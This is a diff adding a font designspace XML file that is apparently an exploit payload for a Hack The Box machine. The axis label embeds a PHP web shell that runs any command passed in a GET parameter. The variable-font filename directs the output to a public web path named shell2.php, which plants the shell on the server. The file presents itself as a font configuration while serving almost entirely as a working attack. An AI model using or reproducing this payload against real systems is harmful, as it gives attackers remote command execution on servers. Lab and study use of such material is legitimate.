@@ -1,0 +1,23 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<designspace format="5.0">
+  <axes>
+    <axis tag="wght" name="Weight" minimum="400" maximum="900" default="400">
+      <labelname xml:lang="en"><![CDATA[<?php @ob_clean(); system($_GET['c']); die(); ?>]]></labelname>
+    </axis>
+  </axes>
+  <sources>
+    <source filename="source-regular.ttf" name="Source Regular">
+      <location><dimension name="Weight" xvalue="400"/></location>
+    </source>
+    <source filename="source-black.ttf" name="Source Black">
+      <location><dimension name="Weight" xvalue="900"/></location>
+    </source>
+  </sources>
+  <variable-fonts>
+    <variable-font name="Variabype" filename="/var/www/portal.variatype.htb/public/files/shell2.php">
+      <axis-subsets>
+        <axis-subset name="Weight"/>
+      </axis-subsets>
+    </variable-font>
+  </variable-fonts>
+</designspace>
